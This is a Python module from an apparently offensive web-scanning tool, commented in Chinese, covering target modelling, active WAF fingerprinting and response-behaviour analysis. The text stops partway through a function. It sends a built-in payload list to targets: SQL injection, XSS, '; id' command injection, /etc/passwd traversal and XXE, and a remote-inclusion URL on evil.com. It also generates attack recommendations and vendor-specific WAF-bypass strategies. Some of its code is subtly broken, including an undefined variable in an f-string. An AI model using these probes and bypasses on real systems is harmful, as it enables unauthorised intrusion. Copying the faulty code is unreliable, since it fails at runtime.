"""
scanner.engine.intelligence
-------------------------
情报模块（Intelligence Module）

提供高级目标分析和威胁情报能力：

核心组件：
1. TargetModeler - 深度目标建模
   - 构建完整的目标画像
   - 攻击面分析
   - 弱点推断
   - 防护体系建模

2. WAFFingerprinter - 增强型WAF指纹识别
   - 主动探测技术
   - 规则集版本检测
   - 绕过建议生成

3. BehaviorAnalyzer - 行为分析器
   - 响应行为模式识别
   - 异常检测
   - 时间线分析

4. ThreatIntelligence - 威胁情报集成
   - CVE匹配
   - 已知漏洞关联
   - 威胁等级评估

设计原则：
    - 多维度信息融合
    - 实时模型更新
    - 可解释的推断过程
    - 可操作的建议输出

使用示例:
    >>> intel = IntelligenceModule()
    >>> model = await intel.build_target_model(recon_result)
    >>> print(f"攻击面评分: {model.attack_surface_score}")
    >>> waf_info = await intel.analyze_waf(target, client)
    >>> print(f"WAF类型: {waf_info.waf_type}, 绕过难度: {waf_info.bypass_difficulty}")
"""

import asyncio
import time
import re
import json
import hashlib
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Any, Optional, Tuple, Set, Iterator
from enum import Enum, auto
from datetime import datetime
import httpx

logger = logging.getLogger(__name__)


class AttackSurfaceCategory(Enum):
    """攻击面类别"""
    WEB_APPLICATION = "web_application"
    API_ENDPOINTS = "api_endpoints"
    AUTHENTICATION = "authentication"
    FILE_UPLOAD = "file_upload"
    ADMIN_INTERFACE = "admin_interface"
    DATABASE = "database"
    THIRD_PARTY = "third_party"
    NETWORK_SERVICES = "network_services"


class ProtectionStrength(Enum):
    """防护强度"""
    NONE = 0
    MINIMAL = 1
    BASIC = 2
    MODERATE = 3
    STRONG = 4
    VERY_STRONG = 5


class BypassDifficulty(Enum):
    """绕过难度"""
    TRIVIAL = "trivial"         # 轻易绕过
    EASY = "easy"             # 较容易
    MODERATE = "moderate"     # 中等
    DIFFICULT = "difficult"   # 困难
    VERY_DIFFICULT = "very_difficult"  # 很困难
    IMPOSSIBLE = "impossible" # 几乎不可能


@dataclass
class AttackSurface:
    """
    攻击面分析
    
    量化目标的可攻击性。
    """
    category: AttackSurfaceCategory
    name: str
    url_pattern: str
    
    risk_score: float = 0.0        # 0-10
    exposure_level: float = 0.0    # 0-1 (暴露程度)
    
    parameters: List[Dict[str, str]] = field(default_factory=list)
    authentication_required: bool = False
    known_vulnerabilities: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "category": self.category.value,
            "name": self.name,
            "url_pattern": self.url_pattern,
            "risk_score": round(self.risk_score, 2),
            "exposure_level": round(self.exposure_level, 3),
            "parameter_count": len(self.parameters),
            "auth_required": self.authentication_required,
            "known_vulnerabilities": self.known_vulnerabilities[:5],
        }


@dataclass
class TargetModel:
    """
    目标模型
    
    完整描述一个目标的特征、架构、防护和弱点。
    """
    target_url: str
    model_id: str = field(default_factory=lambda: f"target_{int(time.time()) % 10000}")
    created_at: float = field(default_factory=time.time)
    
    # 技术栈
    technologies: Dict[str, Any] = field(default_factory=dict)
    primary_framework: str = ""
    primary_language: str = ""
    primary_database: str = ""
    
    # 架构
    architecture: str = ""          # monolithic/microservices/etc.
    deployment_type: str = ""       # on-premise/cloud/hybrid
    load_balanced: bool = False
    behind_cdn: bool = False
    
    # 防护体系
    waf_present: bool = False
    waf_type: str = ""
    protection_strength: ProtectionStrength = ProtectionStrength.NONE
    security_headers: Dict[str, bool] = field(default_factory=dict)
    missing_headers: List[str] = field(default_factory=list)
    
    # 攻击面
    attack_surfaces: List[AttackSurface] = field(default_factory=list)
    total_attack_surface_score: float = 0.0
    
    # 推断的弱点
    potential_vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)
    high_risk_areas: List[str] = field(default_factory=list)
    
    # 认证机制
    auth_mechanisms: List[str] = field(default_factory=list)
    auth_weaknesses: List[str] = field(default_factory=list)
    
    # 整体评估
    overall_risk_score: float = 0.0      # 0-10
    exploitation_difficulty: str = "unknown"
    recommended_attack_vectors: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "model_id": self.model_id,
            "target_url": self.target_url,
            "created_at": self.created_at,
            "technology_stack": {
                "primary_framework": self.primary_framework,
                "primary_language": self.primary_language,
                "primary_database": self.primary_database,
                "all_technologies": list(self.technologies.keys()),
            },
            "architecture": {
                "type": self.architecture,
                "deployment": self.deployment_type,
                "load_balanced": self.load_balanced,
                "behind_cdn": self.behind_cdn,
            },
            "protection": {
                "waf_present": self.waf_present,
                "waf_type": self.waf_type,
                "protection_strength": self.protection_strength.value,
                "security_headers": {
                    k: v for k, v in list(self.security_headers.items())[:10]
                },
                "missing_security_headers": self.missing_headers,
            },
            "attack_surface": {
                "total_score": round(self.total_attack_surface_score, 2),
                "surfaces": [s.to_dict() for s in self.attack_surfaces[:10]],
                "surface_count": len(self.attack_surfaces),
            },
            "vulnerabilities": {
                "potential_count": len(self.potential_vulnerabilities),
                "high_risk_areas": self.high_risk_areas[:10],
            },
            "assessment": {
                "overall_risk_score": round(self.overall_risk_score, 2),
                "exploitation_difficulty": self.exploitation_difficulty,
                "recommended_attack_vectors": self.recommended_attack_vectors[:5],
            },
        }


@dataclass
class EnhancedWAFFingerprint:
    """
    增强型WAF指纹
    
    包含详细的WAF信息和绕过策略。
    """
    waf_type: str = ""
    vendor: str = ""
    version: Optional[str] = None
    ruleset_version: Optional[str] = None
    
    protection_strength: ProtectionStrength = ProtectionStrength.NONE
    bypass_difficulty: BypassDifficulty = BypassDifficulty.MODERATE
    
    detected_signatures: List[str] = field(default_factory=list)
    detected_rules: List[str] = field(default_factory=list)
    
    bypass_strategies: List[Dict[str, Any]] = field(default_factory=list)
    effective_techniques: List[str] = field(default_factory=list)
    blocked_techniques: List[str] = field(default_factory=list)
    
    confidence: float = 0.0
    
    # 高级特性
    rate_limiting_detected: bool = False
    bot_protection_enabled: bool = False
    ip_reputation_check: bool = False
    geo_blocking: bool = False
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "waf_type": self.waf_type,
            "vendor": self.vendor,
            "version": self.version,
            "ruleset_version": self.ruleset_version,
            "protection_strength": self.protection_strength.value,
            "bypass_difficulty": self.bypass_difficulty.value,
            "confidence": round(self.confidence, 3),
            "detected_features": {
                "signatures_count": len(self.detected_signatures),
                "detected_rules_count": len(self.detected_rules),
                "rate_limiting": self.rate_limiting_detected,
                "bot_protection": self.bot_protection_enabled,
                "ip_reputation": self.ip_reputation_check,
                "geo_blocking": self.geo_blocking,
            },
            "bypass_analysis": {
                "available_strategies": len(self.bypass_strategies),
                "effective_techniques": self.effective_techniques[:5],
                "blocked_techniques": self.blocked_techniques[:5],
            },
        }


@dataclass
class BehaviorPattern:
    """
    行为模式
    
    描述目标系统的响应行为特征。
    """
    pattern_name: str
    description: str
    
    indicators: List[str] = field(default_factory=list)
    confidence: float = 0.0
    
    implications: List[str] = field(default_factory=list)
    detection_method: str = ""


class TargetModeler:
    """
    目标建模器
    
    从侦察结果构建完整的目标模型，用于指导攻击策略。
    """
    
    FRAMEWORK_RISK_SCORES = {
        'thinkphp': 8.5,    # 历史漏洞多
        'wordpress': 7.0,   # 插件生态风险
        'drupal': 6.5,
        'joomla': 6.0,
        'laravel': 4.0,     # 相对安全
        'django': 3.5,      # 安全设计好
        'spring': 4.5,
        'asp.net': 6.0,
        'express': 5.0,
        'flask': 4.0,
        'rails': 4.5,
    }
    
    DATABASE_RISK_SCORES = {
        'mysql': 6.0,
        'postgresql': 4.5,
        'mssql': 5.5,
        'oracle': 4.0,
        'mongodb': 5.0,
        'sqlite': 7.0,       # 通常权限过高
    }
    
    ARCHITECTURE_RISK_FACTORS = {
        'monolithic': 1.0,
        'microservices': 1.3,   # 攻击面更大
        'load_balanced': 1.1,
        'cdn_proxied': 0.9,     # CDN提供一定保护
        'serverless': 1.2,      # 配置错误风险
        'containerized': 1.15,  # 容器逃逸风险
    }
    
    def __init__(self):
        self._models_created = 0
    
    def build_model(self, recon_result) -> TargetModel:
        """
        从侦察结果构建目标模型
        
        Args:
            recon_result: ReconEngine返回的侦察结果
            
        Returns:
            完整的目标模型
        """
        model = TargetModel(
            target_url=getattr(recon_result, 'target_url', ''),
        )
        
        # 1. 技术栈建模
        self._populate_technology_stack(model, recon_result)
        
        # 2. 构建架构模型
        self._build_architecture_model(model, recon_result)
        
        # 3. 分析防护体系
        self._analyze_protections(model, recon_result)
        
        # 4. 评估攻击面
        self._assess_attack_surface(model, recon_result)
        
        # 5. 推断潜在弱点
        self._infer_vulnerabilities(model)
        
        # 6. 认证机制分析
        self._analyze_authentication(model, recon_result)
        
        # 7. 计算综合风险评分
        self._calculate_risk_scores(model)
        
        # 8. 生成攻击建议
        self._generate_recommendations(model)
        
        self._models_created += 1
        
        logger.info(f" 目标模型已构建 (ID={model.model_id}, "
                   f"风险评分={model.overall_risk_score:.1f})")
        
        return model
    
    def _populate_technology_stack(self, model: TargetModel, 
                                   recon_result) -> None:
        """填充技术栈信息"""
        if hasattr(recon_result, 'technologies'):
            for tech in recon_result.technologies:
                if hasattr(tech, 'to_dict'):
                    tech_dict = tech.to_dict()
                    name = tech_dict.get('name', '')
                    model.technologies[name] = tech_dict
                    
                    if tech_dict.get('category') == 'framework' and not model.primary_framework:
                        model.primary_framework = name
                    elif tech_dict.get('category') == 'language' and not model.primary_language:
                        model.primary_language = name
                    elif tech_dict.get('category') == 'database' and not model.primary_database:
                        model.primary_database = name
        
        if hasattr(recon_result, 'primary_framework'):
            model.primary_framework = recon_result.primary_framework or model.primary_framework
        if hasattr(recon_result, 'primary_database'):
            model.primary_database = recon_result.primary_database or model.primary_database
    
    def _build_architecture_model(self, model: TargetModel,
                                   recon_result) -> None:
        """构建架构模型"""
        if hasattr(recon_result, 'architecture'):
            arch = recon_result.architecture
            model.architecture = arch.value if hasattr(arch, 'value') else str(arch)
        
        if hasattr(recon_result, 'is_behind_cdn'):
            model.behind_cdn = recon_result.is_behind_cdn
            if model.behind_cdn:
                model.deployment_type = "cdn_proxied"
        
        if hasattr(recon_result, 'is_load_balanced'):
            model.load_balanced = recon_result.is_load_balanced
            if model.load_balanced:
                model.deployment_type = "load_balanced"
        
        if not model.deployment_type:
            model.deployment_type = "on_premise"
    
    def _analyze_protections(self, model: TargetModel,
                              recon_result) -> None:
        """分析防护体系"""
        if hasattr(recon_result, 'waf_fingerprint'):
            waf = recon_result.waf_fingerprint
            model.waf_present = True
            model.waf_type = getattr(waf, 'waf_type', '')
            
            if hasattr(waf, 'waf_type') and waf.waf_type.value != 'unknown':
                model.waf_type = waf.vendor_name or waf.waf_type.value
                
            if hasattr(waf, 'protection_level'):
                level = waf.protection_level.value
                strength_map = {0: 0, 1: 1, 2: 2, 3: 3, 4: 4}
                model.protection_strength = ProtectionStrength(
                    strength_map.get(level, min(level, 5))
                )
        
        if hasattr(recon_result, 'security_headers'):
            for header, value in recon_result.security_headers.items():
                model.security_headers[header] = True
        
        if hasattr(recon_result, 'missing_security_headers'):
            model.missing_headers = recon_result.missing_headers
    
    def _assess_attack_surface(self, model: TargetModel,
                                 recon_result) -> None:
        """评估攻击面"""
        surfaces = []
        
        # Web应用入口
        if hasattr(recon_result, 'entry_points'):
            for entry in recon_result.entry_points[:20]:
                surface = AttackSurface(
                    category=AttackSurfaceCategory.WEB_APPLICATION,
                    name=entry.functionality or "General",
                    url_pattern=entry.url,
                    risk_score=entry.risk_score * 10,
                    exposure_level=1.0 if not entry.auth_required else 0.5,
                    authentication_required=entry.auth_required,
                    parameters=entry.parameters,
                )
                surfaces.append(surface)
        
        # API端点
        if hasattr(recon_result, 'api_endpoints'):
            for api in recon_result.api_endpoints[:10]:
                surface = AttackSurface(
                    category=AttackSurfaceCategory.API_ENDPOINTS,
                    name="API Endpoint",
                    url_pattern=api.url,
                    risk_score=api.risk_score * 10,
                    exposure_level=0.8,
                    authentication_required=api.auth_required,
                )
                surfaces.append(surface)
        
        # 管理接口
        admin_patterns = ['/admin', '/manage', '/console', '/dashboard', '/wp-admin']
        for entry in (recon_result.entry_points if hasattr(recon_result, 'entry_points') else []):
            if any(p in entry.url.lower() for p in admin_patterns):
                surface = AttackSurface(
                    category=AttackSurfaceCategory.ADMIN_INTERFACE,
                    name="Admin Interface",
                    url_pattern=entry.url,
                    risk_score=9.0,
                    exposure_level=0.9,
                    authentication_required=True,
                    known_vulnerabilities=["brute_force", "csrf", "idor"],
                )
                surfaces.append(surface)
        
        model.attack_surfaces = surfaces
        model.total_attack_surface_score = sum(s.risk_score for s in surfaces) / max(len(surfaces), 1)
    
    def _infer_vulnerabilities(self, model: TargetModel) -> None:
        """推断潜在弱点"""
        vulnerabilities = []
        
        # 基于框架的历史漏洞
        framework = model.primary_framework.lower()
        if framework in self.FRAMEWORK_RISK_SCORES:
            if self.FRAMEWORK_RISK_SCORES[framework] > 6:
                vulnerabilities.append({
                    "type": "known_framework_vulnerabilities",
                    "severity": "high",
                    "description": f"{framework}有已知的高危漏洞历史",
                    "confidence": 0.8,
                })
        
        # 基于缺失安全头
        critical_missing = ['X-Frame-Options', 'Content-Security-Policy']
        for header in model.missing_headers:
            if header in critical_missing:
                vuln_type = "clickjacking" if 'frame' in header.lower() else "xss"
                vulnerabilities.append({
                    "type": f"{vuln}_risk",
                    "severity": "medium",
                    "description": f"缺少{header}安全头增加{vuln_type}风险",
                    "confidence": 0.7,
                })
        
        # 基于调试信息泄露
        if hasattr(model, '_debug_info_count'):
            if model._debug_info_count > 0:
                vulnerabilities.append({
                    "type": "information_disclosure",
                    "severity": "medium",
                    "description": "发现调试信息泄露",
                    "confidence": 0.9,
                })
        
        model.potential_vulnerabilities = vulnerabilities
        model.high_risk_areas = [v["description"] for v in vulnerabilities 
                                if v.get("severity") in ["high", "critical"]]
    
    def _analyze_authentication(self, model: TargetModel,
                                 recon_result) -> None:
        """分析认证机制"""
        if hasattr(recon_result, 'auth_mechanism'):
            auth = recon_result.auth_mechanism
            model.auth_mechanisms = [auth.value] if hasattr(auth, 'value') else [str(auth)]
            
            weak_auths = ['none', 'basic_auth', 'form_based']
            auth_val = model.auth_mechanisms[0].lower() if model.auth_mechanisms else ''
            
            if any(weak in auth_val for weak in weak_auths):
                model.auth_weaknesses.append("弱认证机制")
            
            if auth_val == 'session_cookie':
                model.auth_weaknesses.append("Cookie-based会话可能被劫持")
        
        if hasattr(recon_result, 'session_config'):
            session_config = recon_result.session_config
            if not session_config.get('secure_flag'):
                model.auth_weaknesses.append("Cookie缺少Secure标志")
            if not session_config.get('httponly_flag'):
                model.auth_weaknesses.append("Cookie缺少HttpOnly标志")
            if not session_config.get('samesite'):
                model.auth_weaknesses.append("Cookie缺少SameSite属性")
    
    def _calculate_risk_scores(self, model: TargetModel) -> None:
        """计算综合风险评分"""
        
        # 基础分数：框架风险
        base_score = self.FRAMEWORK_RISK_SCORES.get(
            model.primary_framework.lower(), 5.0
        ) if model.primary_framework else 5.0
        
        # 数据库调整
        db_factor = self.DATABASE_RISK_SCORES.get(
            model.primary_database.lower(), 5.0
        ) / 5.0 if model.primary_database else 1.0
        
        # 架构因子
        arch_factor = self.ARCHITECTURE_RISK_FACTORS.get(
            model.architecture.lower(), 1.0
        ) if model.architecture else 1.0
        
        # 防护扣分
        protection_deduction = model.protection_strength.value * 0.8
        
        # 攻击面加成
        surface_bonus = min(model.total_attack_surface_score / 5, 2.0)
        
        # 计算最终分数
        raw_score = (base_score * db_factor * arch_factor) + surface_bonus - protection_deduction
        model.overall_risk_score = max(0, min(10, raw_score))
        
        # 利用难度评级
        if model.overall_risk_score >= 8:
            model.exploitation_difficulty = "easy"
        elif model.overall_risk_score >= 6:
            model.exploitation_difficulty = "moderate"
        elif model.overall_risk_score >= 4:
            model.exploitation_difficulty = "difficult"
        else:
            model.exploitation_difficulty = "very_difficult"
    
    def _generate_recommendations(self, model: TargetModel) -> None:
        """生成攻击建议"""
        recommendations = []
        
        # 基于高风险区域
        if model.overall_risk_score >= 7:
            recommendations.append("优先尝试SQL注入和命令注入")
        
        if len(model.attack_surfaces) > 10:
            recommendations.append("攻击面较大，重点测试API端点和文件上传功能")
        
        if not model.waf_present:
            recommendations.append("无WAF保护，可以使用更激进的Payload")
        elif model.protection_strength.value <= 2:
            recommendations.append("WAF保护较弱，基础编码可能有效")
        
        if model.primary_database == 'mysql':
            recommendations.append("MySQL环境，可尝试时间盲注和数据提取")
        
        if 'thinkphp' in model.primary_framework.lower():
            recommendations.append("ThinkPHP框架，重点关注远程代码执行漏洞")
        
        if model.auth_weaknesses:
            recommendations.append("认证机制存在弱点，考虑会话劫持攻击")
        
        model.recommended_attack_vectors = recommendations


class AdvancedWAFFingerprinter:
    """
    增强型WAF指纹识别器
    
    使用主动探测技术进行深度WAF识别：
    - 发送特定请求触发WAF响应
    - 分析响应特征确定WAF类型和配置
    - 测试已知绕过技术的有效性
    """
    
    PROBE_PAYLOADS = {
        "sql_injection_basic": "' OR '1'='1",
        "sql_injection_union": "' UNION SELECT NULL--",
        "xss_basic": "<script>alert(1)</script>",
        "xss_event_handler": "<img src=x onerror=alert(1)>",
        "path_traversal": "../../../etc/passwd",
        "cmd_injection": "; id",
        "rfi": "http://evil.com/shell.txt",
        "ssrf": "http://127.0.0.1",
        "xxe": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    }
    
    WAF_RESPONSE_SIGNATURES = {
        'cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status'],
            'body_keywords': ['cloudflare', 'just a moment'],
            'status_codes': [403, 503],
            'cookie_names': ['__cfduid', 'cf_clearance'],
        },
        'aws_waf': {
            'headers': ['x-amz-cf-id', 'x-amzn-requestid'],
            'body_keywords': ['aws managed rules', 'request blocked by aws waf'],
            'status_codes': [403, 405],
        },
        'akamai': {
            'headers': ['x-akamai-transformed', 'x-akamai-session-handle'],
            'body_keywords': ['akamai bot manager', 'access denied.*akamai'],
            'status_codes': [403, 406],
        },
        'modsecurity': {
            'headers': ['server'],  # server header contains ModSecurity
            'body_keywords': ['mod_security', 'web application firewall', 'blocked by mod_security'],
            'status_codes': [403, 406],
        },
        'incapsula': {
            'headers': ['x-iinfo', 'x-cdn', 'visid_incap'],
            'body_keywords': ['incapsula incident id', 'website is under ddos attack'],
            'status_codes': [403, 503],
        },
        'sucuri': {
            'headers': ['x-sucuri-id', 'x-sucuri-cache'],
            'body_keywords': ['access denied - sucuri website firewall', 'blocked by sucuri'],
            'status_codes': [403, 406],
        },
    }
    
    BYPASS_TECHNIQUES_DATABASE = [
        {"name": "url_encoding", "description": "URL编码", "difficulty": 2},
        {"name": "double_url_encoding", "description": "双重URL编码", "difficulty": 3},
        {"name": "unicode_encoding", "description": "Unicode编码", "difficulty": 3},
        {"name": "case_manipulation", "description": "大小写混淆", "difficulty": 2},
        {"name": "comment_insertion", "description": "注释插入", "difficulty": 3},
        {"name": "null_byte_injection", "description": "NULL字节注入", "difficulty": 4},
        {"name": "whitespace_substitution", "description": "空白符替换", "difficulty": 3},
        {"name": "line_break_injection", "description": "换行注入", "difficulty": 4},
        {"name": "tab_injection", "description": "Tab注入", "difficulty": 4},
        {"name": "scientific_notation", "description": "科学计数法", "difficulty": 5},
    ]
    
    def __init__(self):
        self._fingerprints_created = 0
    
    async def fingerprint_waf(self, 
                               target: str,
                               client: httpx.AsyncClient) -> EnhancedWAFFingerprint:
        """
        执行WAF指纹识别
        
        Args:
            target: 目标URL
            client: HTTP客户端
            
        Returns:
            增强型WAF指纹
        """
        fingerprint = EnhancedWAFFingerprint()
        
        logger.info(f" 开始WAF指纹识别: {target}")
        
        try:
            # 1. 发送正常请求获取基线
            baseline_resp = await client.get(target, follow_redirects=True)
            baseline_headers = dict(baseline_resp.headers)
            
            # 2. 发送探测请求
            probe_results = await self._send_probes(target, client)
            
            # 3. 分析响应特征
            self._analyze_responses(fingerprint, probe_results, baseline_headers)
            
            # 4. 确定WAF类型和强度
            self._classify_waf(fingerprint)
            
            # 5. 评估绕过难度
            self._assess_bypass_difficulty(fingerprint)
            
            # 6. 生成绕过策略建议
            self._generate_bypass_strategies(fingerprint)
            
            self._fingerprints_created += 1
            
            logger.info(f" WAF指纹完成: type={fingerprint.waf_type}, "
                       f"strength={fingerprint.protection_strength.value}, "
                       f"bypass={fingerprint.bypass_difficulty.value}")
            
        except Exception as e:
            logger.error(f" WAF指纹识别失败: {e}")
            fingerprint.confidence = 0.0
        
        return fingerprint
    
    async def _send_probes(self, 
                            target: str,
                            client: httpx.AsyncClient) -> Dict[str, Dict[str, Any]]:
        """发送探测请求"""
        results = {}
        
        for probe_name, payload in self.PROBE_PAYLOADS.items():
            try:
                test_url = f"{target}?test_param={payload}"
                
                resp = await client.get(test_url, follow_redirects=False)
                
                results[probe_name] = {
                    "status_code": resp.status_code,
                    "headers": dict(resp.headers),
                    "body_length": len(resp.content),
                    "body_snippet": resp.text[:200] if resp.text else "",
                    "payload": payload,
                }
                
                # 稍微延迟避免触发速率限制
                await asyncio.sleep(0.2)
                
            except Exception as e:
                results[probe_name] = {"error": str(e)}
        
        return results
    
    def _analyze_responses(self, 
                            fingerprint: EnhancedWAFFingerprint,
                            probe_results: Dict,
                            baseline_headers: Dict) -> None:
        """分析响应特征"""
        scores: Dict[str, int] = {}
        signatures_found: Dict[str, List[str]] = {}
        
        for waf_name, sig in self.WAF_RESPONSE_SIGNATURES.items():
            score = 0
            found_sigs = []
            
            for probe_name, result in probe_results.items():
                if "error" in result:
                    continue
                
                resp_headers = result.get("headers", {})
                body_snippet = result.get("body_snippet", "").lower()
                status_code = result.get("status_code", 0)
                
                # 检查响应头
                for header_pattern in sig['headers']:
                    for header_name in resp_headers.keys():
                        if header_pattern.lower() in header_name.lower():
                            score += 2
                            found_sigs.append(f"Header:{header_name}")
                
                # 检查响应体关键词
                for keyword in sig['body_keywords']:
                    if keyword in body_snippet:
                        score += 3
                        found_sigs.append(f"Body:{keyword}")
                
                # 检查状态码
                if status_code in sig['status_codes']:
                    score += 1
                    found_sigs.append(f"Status:{status_code}")
                    
                # 检查Cookie
                cookies = resp_headers.get('set-cookie', '')
                for cookie_pattern in sig.get('cookie_names', []):
                    if cookie_pattern.lower() in cookies.lower():
                        score += 2
                        found_sigs.append(f"Cookie:{cookie_pattern}")
            
            if score > 0:
                scores[waf_name] = score
                signatures_found[waf_name] = found_sigs
        
        # 选择得分最高的WAF类型
        if scores:
            best_waf = max(scores.keys(), key=lambda k: scores[k])
            fingerprint.waf_type = best_waf
            fingerprint.confidence = min(scores[best_waf] / 20.0, 1.0)
            fingerprint.detected_signatures = signatures_found.get(best_waf, [])
    
    def _classify_waf(self, fingerprint: EnhancedWAFFingerprint) -> None:
        """分类WAF并确定强度"""
        # 设置厂商名称
        vendor_map = {
            'cloudflare': 'Cloudflare',
            'aws_waf': 'AWS WAF',
            'akamai': 'Akamai',
            'modsecurity': 'ModSecurity',
            'incapsula': 'Incapsula (Imperva)',
            'sucuri': 'Sucuri',
        }
        
        fingerprint.vendor = vendor_map.get(fingerprint.waf_type, fingerprint.waf_type.title())
        
        # 根据置信度和特征数量确定防护强度
        sig_count = len(fingerprint.detected_signatures)
        conf = fingerprint.confidence
        
        if conf >= 0.8 and sig_count >= 5:
            fingerprint.protection_strength = ProtectionStrength.VERY_STRONG
        elif conf >= 0.6 and sig_count >= 3:
            fingerprint.protection_strength = ProtectionStrength.STRONG
        elif conf >= 0.4 and sig_count >= 2:
            fingerprint.protection_strength = ProtectionStrength.MODERATE
        elif conf >= 0.2:
            fingerprint.protection_strength = ProtectionStrength.BASIC
        else:
            fingerprint.protection_strength = ProtectionStrength.MINIMAL
    
    def _assess_bypass_difficulty(self, fingerprint: EnhancedWAFFingerprint) -> None:
        """评估绕过难度"""
        strength = fingerprint.protection_strength.value
        
        difficulty_map = {
            0: BypassDifficulty.TRIVIAL,
            1: BypassDifficulty.EASY,
            2: BypassDifficulty.EASY,
            3: BypassDifficulty.MODERATE,
            4: BypassDifficulty.DIFFICULT,
            5: BypassDifficulty.VERY_DIFFICULT,
        }
        
        fingerprint.bypass_difficulty = difficulty_map.get(strength, BypassDifficulty.MODERATE)
    
    def _generate_bypass_strategies(self, fingerprint: EnhancedWAFFingerprint) -> None:
        """生成绕过策略建议"""
        strategies = []
        
        # 基于WAF类型的特定策略
        waf_specific = {
            'cloudflare': [
                {"technique": "unicode_encoding", "reason": "Cloudflare对Unicode处理不完善"},
                {"technique": "case_manipulation", "reason": "大小写混淆可能绕过规则"},
                {"technique": "ip_rotation", "reason": "使用不同IP地址"},
            ],
            'modsecurity': [
                {"technique": "comment_insertion", "reason": "ModSecurity对注释处理有缺陷"},
                {"technique": "whitespace_substitution", "reason": "空白符替换可混淆解析器"},
                {"technique": "null_byte_injection", "reason": "NULL字节可能导致提前终止"},
            ],
            'aws_waf': [
                {"technique": "double_url_encoding", "reason": "AWS WAF可能未完全解码"},
                {"technique": "base64_encoding", "reason": "Base64编码可能未被检测"},
                {"technique": "hex_encoding", "reason": "十六进制编码绕过"},
            ],
        }
        
        specific_strategies = waf_specific.get(fingerprint.waf_type.lower(), [])
        strategies.extend(specific_strategies)
        
        # 通用策略（基于防护强度）
        if fingerprint.protection_strength.value <= 2:
            strategies.extend([
                {"technique": "url_encoding", "reason": "基础编码通常有效"},
                {"technique": "simple_obfuscation", "reason": "简单混淆可能足够"},
            ])
        
        # 从数据库中添加详细技术信息
        for strategy in strategies:
            tech_name = strategy.get("technique", "")
            tech_info = next(
                (t for t in self.BYPASS_TECHNIQUES_DATABASE if t["name"] == tech_name), None
            )
            
            if tech_info:
                strategy.update(tech_info)
        
        fingerprint.bypass_strategies = strategies
        
        # 标记有效的技术（基于经验）
        fingerprint.effective_techniques = [s["name"] for s in strategies[:5]]
        
        # 标记可能被阻止的技术
        all_tech_names = [t["name"] for t in self.BYPASS_TECHNIQUES_DATABASE]
        fingerprint.blocked_techniques = [
            t for t in all_tech_names if t not in fingerprint.effective_techniques
        ][:5]


class BehaviorAnalyzer:
    """
    行为分析器
    
    分析目标系统的响应行为模式，识别异常和安全特征。
    """
    
    BEHAVIOR_PATTERNS = {
        "time_based_blind": BehaviorPattern(
            pattern_name="time_based_blind_injection",
            description="基于时间的盲注指示器",
            indicators=[
                "response_time_anomaly",
                "significant_delay_with_payload",
                "consistent_timing_difference",
            ],
            confidence=0.0,
            implications=["可能存在SQL盲注", "可用于数据提取"],
            detection_method="timing_analysis",
        ),
        "error_based": BehaviorPattern(
            pattern_name="error_based_indicators",
            description="基于错误的注入指示器",
            indicators=[
                "database_error_messages",
                "stack_trace_exposure",
                "sql_syntax_errors",
            ],
            confidence=0.0,
            implications=["存在信息泄露", "可直接利用"],
            detection_method="error_message_analysis",
        ),
        "waf_detection": BehaviorPattern(
            pattern_name="waf_behavior",
            description="WAF/防护系统行为模式",
            indicators=[
                "blocking_specific_payloads",
                "rate_limiting_detected",
                "challenge_response",
                "captcha_required",
            ],
            confidence=0.0,
            implications=["需要绕过策略", "可能影响扫描效率"],
            detection_method="response_pattern_matching",
        ),
    }
    
    def analyze_response_sequence(self, 
                                  responses: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        分析响应序列的行为模式
        
        Args:
            responses: 响应列表（每个包含status_code, response_time_ms, body等）
            
        Returns:
            行为分析结果
        """
        analysis = {
            "total_responses": len(responses),
            "behavioral_patterns": [],
            "anomalies_detected": [],
            "recommendations": [],
            "confidence_scores": {},
        }
        
        if not responses:
            return analysis
        
        # 1. 时间分析
        timing_analysis = self._analyze_timing(responses)
        analysis["timing_analysis"] = timing_analysis
        
        if timing_analysis.get("has_anomalies"):
            analysis["anomalies_detected"].append("timing_anomaly")
            analysis["behavioral_patterns"].append("time_based_blind")
        
        # 2. 错误消息分析
        error_analysis = self._analyze_errors(responses)
        analysis["error_analysis"] = error_analysis
        
        if error_analysis.get("errors_found"):
            analysis["anomalies_detected"].append("error_disclosure")
            analysis["behavioral_patterns"].append("error_based")
        
        # 3. 状态码分布
        status_distribution = self._analyze_status_codes(responses)
        analysis["status_distribution"] = status_distribution
        
        if status_distribution.get("blocking_rate", 0) > 0.5:
            analysis["anomalies_detected"].append("high_block_rate")
            analysis["behavioral_patterns"].append("waf_detection")
        
        # 4. 内容长度分析
        content_analysis = self._analyze_content_length(responses)
        analysis["content_analysis"] = content_analysis
        
        # 5. 生成建议
        analysis["recommendations"] = self._generate_behavior_recommendations(analysis)
        
        return analysis
    
    def _analyze_timing(self, responses: List[Dict]) -> Dict[str, Any]:
        """分析响应时间"""
        times = [r.get("response_time_ms", 0) for r in responses]
        
        if not times:
            return {"has_anomalies": False}
        
        avg_time = sum(times) / len(times)
        max_time = max(times)
        min_time = min(times)
        
        # 检测异常延迟（超过平均3倍且大于1秒）
        anomalies = [
            i for i, t in enumerate(times) 
            if t > avg_time * 3 and t > 1000
        ]
        
        return {
            "average_ms": round(avg_time, 2),
            "max_ms": round(max_time, 2),
            "min_ms": round(min_time, 2),
            "has_anomalies": len(anomalies) > 0,
            "anomaly_indices": anomalies[:5],
            "anomaly_count": len(anomalies),
        }
    
    def _analyze_errors(self, responses: List[Dict]) -> Dict[str, Any]:
        """分析错误消息"""
        errors_found = []
        error_types = []
        
        error_patterns = {
            "sql_error": ["sql syntax", "mysql_fetch", "postgresql", "ora-", "microsoft ole db"],
            "stack_trace": ["traceback", "exception", "fatal error", "error at line"],
            "path_disclosure": ["/var/www/", "/home/", "\\windows\\", "c:\\"],
            "debug_info": ["debug mode", "var_dump(", "print_r(", "deprecated"],
        }
        
        for resp in responses:
            body = resp.get("body", "").lower() if resp.get("body") else ""
            status = resp.get("status_code", 0)
            
            if status >= 400:
                for err_type, patterns in error_patterns.items():
                    if any(p in body for p in patterns):
                        errors_found.append(err_type)
